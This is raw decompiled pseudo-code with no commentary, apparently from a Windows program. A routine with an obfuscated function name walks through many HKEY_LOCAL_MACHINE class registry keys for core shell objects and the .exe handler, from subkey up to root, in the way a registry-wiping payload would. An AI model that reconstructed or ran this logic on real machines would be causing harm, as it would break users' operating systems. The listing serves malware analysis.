  loc_00458B42: call var_C9A8 = global_004011CC
  loc_00458B58: call var_C9AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\Implemented Categories\{7DD95802-9882-11CF-9FA9-00AA006C42C4}")
  loc_00458B64: var_C9B0 = OnudaSilloA(global_80000002, var_C9AC)
  loc_00458B69: call var_C9B4 = global_00401054
  loc_00458B72: call var_C9B8 = global_004011CC
  loc_00458B88: call var_C9BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\Implemented Categories\{7DD95801-9882-11CF-9FA9-00AA006C42C4}")
  loc_00458B94: var_C9C0 = OnudaSilloA(global_80000002, var_C9BC)
  loc_00458B99: call var_C9C4 = global_00401054
  loc_00458BA2: call var_C9C8 = global_004011CC
  loc_00458BB8: call var_C9CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\Implemented Categories")
  loc_00458BC4: var_C9D0 = OnudaSilloA(global_80000002, var_C9CC)
  loc_00458BC9: call var_C9D4 = global_00401054
  loc_00458BD2: call var_C9D8 = global_004011CC
  loc_00458BE8: call var_C9DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\GetSet\1")
  loc_00458BF4: var_C9E0 = OnudaSilloA(global_80000002, var_C9DC)
  loc_00458BF9: call var_C9E4 = global_00401054
  loc_00458C02: call var_C9E8 = global_004011CC
  loc_00458C18: call var_C9EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\GetSet\0")
  loc_00458C24: var_C9F0 = OnudaSilloA(global_80000002, var_C9EC)
  loc_00458C29: call var_C9F4 = global_00401054
  loc_00458C32: call var_C9F8 = global_004011CC
  loc_00458C48: call var_C9FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\GetSet")
  loc_00458C54: var_CA00 = OnudaSilloA(global_80000002, var_C9FC)
  loc_00458C59: call var_CA04 = global_00401054
  loc_00458C62: call var_CA08 = global_004011CC
  loc_00458C78: call var_CA0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\DefaultSet")
  loc_00458C84: var_CA10 = OnudaSilloA(global_80000002, var_CA0C)
  loc_00458C89: call var_CA14 = global_00401054
  loc_00458C92: call var_CA18 = global_004011CC
  loc_00458CA8: call var_CA1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats\DefaultFile")
  loc_00458CB4: var_CA20 = OnudaSilloA(global_80000002, var_CA1C)
  loc_00458CB9: call var_CA24 = global_00401054
  loc_00458CC2: call var_CA28 = global_004011CC
  loc_00458CD8: call var_CA2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\DataFormats")
  loc_00458CE4: var_CA30 = OnudaSilloA(global_80000002, var_CA2C)
  loc_00458CE9: call var_CA34 = global_00401054
  loc_00458CF2: call var_CA38 = global_004011CC
  loc_00458D08: call var_CA3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\AuxUserType\3")
  loc_00458D14: var_CA40 = OnudaSilloA(global_80000002, var_CA3C)
  loc_00458D19: call var_CA44 = global_00401054
  loc_00458D22: call var_CA48 = global_004011CC
  loc_00458D38: call var_CA4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\AuxUserType\2")
  loc_00458D44: var_CA50 = OnudaSilloA(global_80000002, var_CA4C)
  loc_00458D49: call var_CA54 = global_00401054
  loc_00458D52: call var_CA58 = global_004011CC
  loc_00458D68: call var_CA5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\AuxUserType")
  loc_00458D74: var_CA60 = OnudaSilloA(global_80000002, var_CA5C)
  loc_00458D79: call var_CA64 = global_00401054
  loc_00458D82: call var_CA68 = global_004011CC
  loc_00458D98: call var_CA6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}")
  loc_00458DA4: var_CA70 = OnudaSilloA(global_80000002, var_CA6C)
  loc_00458DA9: call var_CA74 = global_00401054
  loc_00458DB2: call var_CA78 = global_004011CC
  loc_00458DC8: call var_CA7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{4516EC41-8F20-11d0-9B6D-0000C0781BC3}\InprocServer32")
  loc_00458DD4: var_CA80 = OnudaSilloA(global_80000002, var_CA7C)
  loc_00458DD9: call var_CA84 = global_00401054
  loc_00458DE2: call var_CA88 = global_004011CC
  loc_00458DF8: call var_CA8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{4516EC41-8F20-11d0-9B6D-0000C0781BC3}")
  loc_00458E04: var_CA90 = OnudaSilloA(global_80000002, var_CA8C)
  loc_00458E09: call var_CA94 = global_00401054
  loc_00458E12: call var_CA98 = global_004011CC
  loc_00458E28: call var_CA9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\ShellFolder")
  loc_00458E34: var_CAA0 = OnudaSilloA(global_80000002, var_CA9C)
  loc_00458E39: call var_CAA4 = global_00401054
  loc_00458E42: call var_CAA8 = global_004011CC
  loc_00458E58: call var_CAAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\PropertySheetHandlers\{596AB062-B4D2-4215-9F74-E9109B0A8153}")
  loc_00458E64: var_CAB0 = OnudaSilloA(global_80000002, var_CAAC)
  loc_00458E69: call var_CAB4 = global_00401054
  loc_00458E72: call var_CAB8 = global_004011CC
  loc_00458E88: call var_CABC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\PropertySheetHandlers\{4a7ded0a-ad25-11d0-98a8-0800361b1103}")
  loc_00458E94: var_CAC0 = OnudaSilloA(global_80000002, var_CABC)
  loc_00458E99: call var_CAC4 = global_00401054
  loc_00458EA2: call var_CAC8 = global_004011CC
  loc_00458EB8: call var_CACC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\PropertySheetHandlers")
  loc_00458EC4: var_CAD0 = OnudaSilloA(global_80000002, var_CACC)
  loc_00458EC9: call var_CAD4 = global_00401054
  loc_00458ED2: call var_CAD8 = global_004011CC
  loc_00458EE8: call var_CADC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\ContextMenuHandlers\Offline Files")
  loc_00458EF4: var_CAE0 = OnudaSilloA(global_80000002, var_CADC)
  loc_00458EF9: call var_CAE4 = global_00401054
  loc_00458F02: call var_CAE8 = global_004011CC
  loc_00458F18: call var_CAEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex\ContextMenuHandlers")
  loc_00458F24: var_CAF0 = OnudaSilloA(global_80000002, var_CAEC)
  loc_00458F29: call var_CAF4 = global_00401054
  loc_00458F32: call var_CAF8 = global_004011CC
  loc_00458F48: call var_CAFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shellex")
  loc_00458F54: var_CB00 = OnudaSilloA(global_80000002, var_CAFC)
  loc_00458F59: call var_CB04 = global_00401054
  loc_00458F62: call var_CB08 = global_004011CC
  loc_00458F78: call var_CB0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find\ddeexec\topic")
  loc_00458F84: var_CB10 = OnudaSilloA(global_80000002, var_CB0C)
  loc_00458F89: call var_CB14 = global_00401054
  loc_00458F92: call var_CB18 = global_004011CC
  loc_00458FA8: call var_CB1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find\ddeexec\application")
  loc_00458FB4: var_CB20 = OnudaSilloA(global_80000002, var_CB1C)
  loc_00458FB9: call var_CB24 = global_00401054
  loc_00458FC2: call var_CB28 = global_004011CC
  loc_00458FD8: call var_CB2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find\ddeexec")
  loc_00458FE4: var_CB30 = OnudaSilloA(global_80000002, var_CB2C)
  loc_00458FE9: call var_CB34 = global_00401054
  loc_00458FF2: call var_CB38 = global_004011CC
  loc_00459008: call var_CB3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find\command")
  loc_00459014: var_CB40 = OnudaSilloA(global_80000002, var_CB3C)
  loc_00459019: call var_CB44 = global_00401054
  loc_00459022: call var_CB48 = global_004011CC
  loc_00459038: call var_CB4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell\find")
  loc_00459044: var_CB50 = OnudaSilloA(global_80000002, var_CB4C)
  loc_00459049: call var_CB54 = global_00401054
  loc_00459052: call var_CB58 = global_004011CC
  loc_00459068: call var_CB5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\shell")
  loc_00459074: var_CB60 = OnudaSilloA(global_80000002, var_CB5C)
  loc_00459079: call var_CB64 = global_00401054
  loc_00459082: call var_CB68 = global_004011CC
  loc_00459098: call var_CB6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\InProcServer32")
  loc_004590A4: var_CB70 = OnudaSilloA(global_80000002, var_CB6C)
  loc_004590A9: call var_CB74 = global_00401054
  loc_004590B2: call var_CB78 = global_004011CC
  loc_004590C8: call var_CB7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon")
  loc_004590D4: var_CB80 = OnudaSilloA(global_80000002, var_CB7C)
  loc_004590D9: call var_CB84 = global_00401054
  loc_004590E2: call var_CB88 = global_004011CC
  loc_004590F8: call var_CB8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}")
  loc_00459104: var_CB90 = OnudaSilloA(global_80000002, var_CB8C)
  loc_00459109: call var_CB94 = global_00401054
  loc_00459112: call var_CB98 = global_004011CC
  loc_00459128: call var_CB9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\VersionIndependentProgID")
  loc_00459134: var_CBA0 = OnudaSilloA(global_80000002, var_CB9C)
  loc_00459139: call var_CBA4 = global_00401054
  loc_00459142: call var_CBA8 = global_004011CC
  loc_00459158: call var_CBAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\Version")
  loc_00459164: var_CBB0 = OnudaSilloA(global_80000002, var_CBAC)
  loc_00459169: call var_CBB4 = global_00401054
  loc_00459172: call var_CBB8 = global_004011CC
  loc_00459188: call var_CBBC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\TypeLib")
  loc_00459194: var_CBC0 = OnudaSilloA(global_80000002, var_CBBC)
  loc_00459199: call var_CBC4 = global_00401054
  loc_004591A2: call var_CBC8 = global_004011CC
  loc_004591B8: call var_CBCC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\ToolboxBitmap32")
  loc_004591C4: var_CBD0 = OnudaSilloA(global_80000002, var_CBCC)
  loc_004591C9: call var_CBD4 = global_00401054
  loc_004591D2: call var_CBD8 = global_004011CC
  loc_004591E8: call var_CBDC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\Programmable")
  loc_004591F4: var_CBE0 = OnudaSilloA(global_80000002, var_CBDC)
  loc_004591F9: call var_CBE4 = global_00401054
  loc_00459202: call var_CBE8 = global_004011CC
  loc_00459218: call var_CBEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\ProgID")
  loc_00459224: var_CBF0 = OnudaSilloA(global_80000002, var_CBEC)
  loc_00459229: call var_CBF4 = global_00401054
  loc_00459232: call var_CBF8 = global_004011CC
  loc_00459248: call var_CBFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\MiscStatus\1")
  loc_00459254: var_CC00 = OnudaSilloA(global_80000002, var_CBFC)
  loc_00459259: call var_CC04 = global_00401054
  loc_00459262: call var_CC08 = global_004011CC
  loc_00459278: call var_CC0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\MiscStatus")
  loc_00459284: var_CC10 = OnudaSilloA(global_80000002, var_CC0C)
  loc_00459289: call var_CC14 = global_00401054
  loc_00459292: call var_CC18 = global_004011CC
  loc_004592A8: call var_CC1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\InprocServer32")
  loc_004592B4: var_CC20 = OnudaSilloA(global_80000002, var_CC1C)
  loc_004592B9: call var_CC24 = global_00401054
  loc_004592C2: call var_CC28 = global_004011CC
  loc_004592D8: call var_CC2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}\Control")
  loc_004592E4: var_CC30 = OnudaSilloA(global_80000002, var_CC2C)
  loc_004592E9: call var_CC34 = global_00401054
  loc_004592F2: call var_CC38 = global_004011CC
  loc_00459308: call var_CC3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44F9A03B-A3EC-4F3B-9364-08E0007F21DF}")
  loc_00459314: var_CC40 = OnudaSilloA(global_80000002, var_CC3C)
  loc_00459319: call var_CC44 = global_00401054
  loc_00459322: call var_CC48 = global_004011CC
  loc_00459338: call var_CC4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44EC053A-400F-11D0-9DCD-00A0C90391D3}\ProgID")
  loc_00459344: var_CC50 = OnudaSilloA(global_80000002, var_CC4C)
  loc_00459349: call var_CC54 = global_00401054
  loc_00459352: call var_CC58 = global_004011CC
  loc_00459368: call var_CC5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44EC053A-400F-11D0-9DCD-00A0C90391D3}\InprocServer32")
  loc_00459374: var_CC60 = OnudaSilloA(global_80000002, var_CC5C)
  loc_00459379: call var_CC64 = global_00401054
  loc_00459382: call var_CC68 = global_004011CC
  loc_00459398: call var_CC6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44EC053A-400F-11D0-9DCD-00A0C90391D3}")
  loc_004593A4: var_CC70 = OnudaSilloA(global_80000002, var_CC6C)
  loc_004593A9: call var_CC74 = global_00401054
  loc_004593B2: call var_CC78 = global_004011CC
  loc_004593C8: call var_CC7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}\VersionIndependentProgID")
  loc_004593D4: var_CC80 = OnudaSilloA(global_80000002, var_CC7C)
  loc_004593D9: call var_CC84 = global_00401054
  loc_004593E2: call var_CC88 = global_004011CC
  loc_004593F8: call var_CC8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}\ProgID")
  loc_00459404: var_CC90 = OnudaSilloA(global_80000002, var_CC8C)
  loc_00459409: call var_CC94 = global_00401054
  loc_00459412: call var_CC98 = global_004011CC
  loc_00459428: call var_CC9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}\InprocServer32")
  loc_00459434: var_CCA0 = OnudaSilloA(global_80000002, var_CC9C)
  loc_00459439: call var_CCA4 = global_00401054
  loc_00459442: call var_CCA8 = global_004011CC
  loc_00459458: call var_CCAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}\DocObject")
  loc_00459464: var_CCB0 = OnudaSilloA(global_80000002, var_CCAC)
  loc_00459469: call var_CCB4 = global_00401054
  loc_00459472: call var_CCB8 = global_004011CC
  loc_00459488: call var_CCBC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{44CCBCEB-BA7E-4C99-A078-9F683832D493}")
  loc_00459494: var_CCC0 = OnudaSilloA(global_80000002, var_CCBC)
  loc_00459499: call var_CCC4 = global_00401054
  loc_004594A2: call var_CCC8 = global_004011CC
  loc_004594B8: call var_CCCC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\ShellFolder")
  loc_004594C4: var_CCD0 = OnudaSilloA(global_80000002, var_CCCC)
  loc_004594C9: call var_CCD4 = global_00401054
  loc_004594D2: call var_CCD8 = global_004011CC
  loc_004594E8: call var_CCDC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex\PropertySheetHandlers\{645FF040-5081-101B-9F08-00AA002F954E}")
  loc_004594F4: var_CCE0 = OnudaSilloA(global_80000002, var_CCDC)
  loc_004594F9: call var_CCE4 = global_00401054
  loc_00459502: call var_CCE8 = global_004011CC
  loc_00459518: call var_CCEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex\PropertySheetHandlers")
  loc_00459524: var_CCF0 = OnudaSilloA(global_80000002, var_CCEC)
  loc_00459529: call var_CCF4 = global_00401054
  loc_00459532: call var_CCF8 = global_004011CC
  loc_00459548: call var_CCFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex\ContextMenuHandlers\{645FF040-5081-101B-9F08-00AA002F954E}")
  loc_00459554: var_CD00 = OnudaSilloA(global_80000002, var_CCFC)
  loc_00459559: call var_CD04 = global_00401054
  loc_00459562: call var_CD08 = global_004011CC
  loc_00459578: call var_CD0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex\ContextMenuHandlers")
  loc_00459584: var_CD10 = OnudaSilloA(global_80000002, var_CD0C)
  loc_00459589: call var_CD14 = global_00401054
  loc_00459592: call var_CD18 = global_004011CC
  loc_004595A8: call var_CD1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shellex")
  loc_004595B4: var_CD20 = OnudaSilloA(global_80000002, var_CD1C)
  loc_004595B9: call var_CD24 = global_00401054
  loc_004595C2: call var_CD28 = global_004011CC
  loc_004595D8: call var_CD2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\InProcServer32")
  loc_004595E4: var_CD30 = OnudaSilloA(global_80000002, var_CD2C)
  loc_004595E9: call var_CD34 = global_00401054
  loc_004595F2: call var_CD38 = global_004011CC
  loc_00459608: call var_CD3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\DefaultIcon")
  loc_00459614: var_CD40 = OnudaSilloA(global_80000002, var_CD3C)
  loc_00459619: call var_CD44 = global_00401054
  loc_00459622: call var_CD48 = global_004011CC
  loc_00459638: call var_CD4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}")
  loc_00459644: var_CD50 = OnudaSilloA(global_80000002, var_CD4C)
  loc_00459649: call var_CD54 = global_00401054
  loc_00459652: call var_CD58 = global_004011CC
  loc_00459668: call var_CD5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\ShellFolder")
  loc_00459674: var_CD60 = OnudaSilloA(global_80000002, var_CD5C)
  loc_00459679: call var_CD64 = global_00401054
  loc_00459682: call var_CD68 = global_004011CC
  loc_00459698: call var_CD6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find\ddeexec\topic")
  loc_004596A4: var_CD70 = OnudaSilloA(global_80000002, var_CD6C)
  loc_004596A9: call var_CD74 = global_00401054
  loc_004596B2: call var_CD78 = global_004011CC
  loc_004596C8: call var_CD7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find\ddeexec\application")
  loc_004596D4: var_CD80 = OnudaSilloA(global_80000002, var_CD7C)
  loc_004596D9: call var_CD84 = global_00401054
  loc_004596E2: call var_CD88 = global_004011CC
  loc_004596F8: call var_CD8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find\ddeexec")
  loc_00459704: var_CD90 = OnudaSilloA(global_80000002, var_CD8C)
  loc_00459709: call var_CD94 = global_00401054
  loc_00459712: call var_CD98 = global_004011CC
  loc_00459728: call var_CD9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find\command")
  loc_00459734: var_CDA0 = OnudaSilloA(global_80000002, var_CD9C)
  loc_00459739: call var_CDA4 = global_00401054
  loc_00459742: call var_CDA8 = global_004011CC
  loc_00459758: call var_CDAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell\find")
  loc_00459764: var_CDB0 = OnudaSilloA(global_80000002, var_CDAC)
  loc_00459769: call var_CDB4 = global_00401054
  loc_00459772: call var_CDB8 = global_004011CC
  loc_00459788: call var_CDBC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\shell")
  loc_00459794: var_CDC0 = OnudaSilloA(global_80000002, var_CDBC)
  loc_00459799: call var_CDC4 = global_00401054
  loc_004597A2: call var_CDC8 = global_004011CC
  loc_004597B8: call var_CDCC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\InProcServer32")
  loc_004597C4: var_CDD0 = OnudaSilloA(global_80000002, var_CDCC)
  loc_004597C9: call var_CDD4 = global_00401054
  loc_004597D2: call var_CDD8 = global_004011CC
  loc_004597E8: call var_CDDC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon")
  loc_004597F4: var_CDE0 = OnudaSilloA(global_80000002, var_CDDC)
  loc_004597F9: call var_CDE4 = global_00401054
  loc_00459802: call var_CDE8 = global_004011CC
  loc_00459818: call var_CDEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}")
  loc_00459824: var_CDF0 = OnudaSilloA(global_80000002, var_CDEC)
  loc_00459829: call var_CDF4 = global_00401054
  loc_00459832: call var_CDF8 = global_004011CC
  loc_00459848: call var_CDFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\ShellFolder")
  loc_00459854: var_CE00 = OnudaSilloA(global_80000002, var_CDFC)
  loc_00459859: call var_CE04 = global_00401054
  loc_00459862: call var_CE08 = global_004011CC
  loc_00459878: call var_CE0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Manage\command")
  loc_00459884: var_CE10 = OnudaSilloA(global_80000002, var_CE0C)
  loc_00459889: call var_CE14 = global_00401054
  loc_00459892: call var_CE18 = global_004011CC
  loc_004598A8: call var_CE1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\Manage")
  loc_004598B4: var_CE20 = OnudaSilloA(global_80000002, var_CE1C)
  loc_004598B9: call var_CE24 = global_00401054
  loc_004598C2: call var_CE28 = global_004011CC
  loc_004598D8: call var_CE2C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find\ddeexec\topic")
  loc_004598E4: var_CE30 = OnudaSilloA(global_80000002, var_CE2C)
  loc_004598E9: call var_CE34 = global_00401054
  loc_004598F2: call var_CE38 = global_004011CC
  loc_00459908: call var_CE3C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find\ddeexec\application")
  loc_00459914: var_CE40 = OnudaSilloA(global_80000002, var_CE3C)
  loc_00459919: call var_CE44 = global_00401054
  loc_00459922: call var_CE48 = global_004011CC
  loc_00459938: call var_CE4C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find\ddeexec")
  loc_00459944: var_CE50 = OnudaSilloA(global_80000002, var_CE4C)
  loc_00459949: call var_CE54 = global_00401054
  loc_00459952: call var_CE58 = global_004011CC
  loc_00459968: call var_CE5C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find\command")
  loc_00459974: var_CE60 = OnudaSilloA(global_80000002, var_CE5C)
  loc_00459979: call var_CE64 = global_00401054
  loc_00459982: call var_CE68 = global_004011CC
  loc_00459998: call var_CE6C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\find")
  loc_004599A4: var_CE70 = OnudaSilloA(global_80000002, var_CE6C)
  loc_004599A9: call var_CE74 = global_00401054
  loc_004599B2: call var_CE78 = global_004011CC
  loc_004599C8: call var_CE7C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell")
  loc_004599D4: var_CE80 = OnudaSilloA(global_80000002, var_CE7C)
  loc_004599D9: call var_CE84 = global_00401054
  loc_004599E2: call var_CE88 = global_004011CC
  loc_004599F8: call var_CE8C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InProcServer32")
  loc_00459A04: var_CE90 = OnudaSilloA(global_80000002, var_CE8C)
  loc_00459A09: call var_CE94 = global_00401054
  loc_00459A12: call var_CE98 = global_004011CC
  loc_00459A28: call var_CE9C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon")
  loc_00459A34: var_CEA0 = OnudaSilloA(global_80000002, var_CE9C)
  loc_00459A39: call var_CEA4 = global_00401054
  loc_00459A42: call var_CEA8 = global_004011CC
  loc_00459A58: call var_CEAC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}")
  loc_00459A64: var_CEB0 = OnudaSilloA(global_80000002, var_CEAC)
  loc_00459A69: call var_CEB4 = global_00401054
  loc_00459A72: call var_CEB8 = global_004011CC
  loc_00459A88: call var_CEBC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\ShellFolder")
  loc_00459A94: var_CEC0 = OnudaSilloA(global_80000002, var_CEBC)
  loc_00459A99: call var_CEC4 = global_00401054
  loc_00459AA2: call var_CEC8 = global_004011CC
  loc_00459AB8: call var_CECC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command")
  loc_00459AC4: var_CED0 = OnudaSilloA(global_80000002, var_CECC)
  loc_00459AC9: call var_CED4 = global_00401054
  loc_00459AD2: call var_CED8 = global_004011CC
  loc_00459AE8: call var_CEDC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage")
  loc_00459AF4: var_CEE0 = OnudaSilloA(global_80000002, var_CEDC)
  loc_00459AF9: call var_CEE4 = global_00401054
  loc_00459B02: call var_CEE8 = global_004011CC
  loc_00459B18: call var_CEEC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell")
  loc_00459B24: var_CEF0 = OnudaSilloA(global_80000002, var_CEEC)
  loc_00459B29: call var_CEF4 = global_00401054
  loc_00459B32: call var_CEF8 = global_004011CC
  loc_00459B48: call var_CEFC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\InProcServer32")
  loc_00459B54: var_CF00 = OnudaSilloA(global_80000002, var_CEFC)
  loc_00459B59: call var_CF04 = global_00401054
  loc_00459B62: call var_CF08 = global_004011CC
  loc_00459B78: call var_CF0C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\DefaultIcon")
  loc_00459B84: var_CF10 = OnudaSilloA(global_80000002, var_CF0C)
  loc_00459B89: call var_CF14 = global_00401054
  loc_00459B92: call var_CF18 = global_004011CC
  loc_00459BA8: call var_CF1C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}")
  loc_00459BB4: var_CF20 = OnudaSilloA(global_80000002, var_CF1C)
  loc_00459BB9: call var_CF24 = global_00401054
  loc_00459BC2: call var_CF28 = global_004011CC
  loc_00459BD8: call var_CF2C = global_00401188(var_24, "SOFTWARE\Classes\.exe\PersistentHandler")
  loc_00459BE4: var_CF30 = OnudaSilloA(global_80000002, var_CF2C)
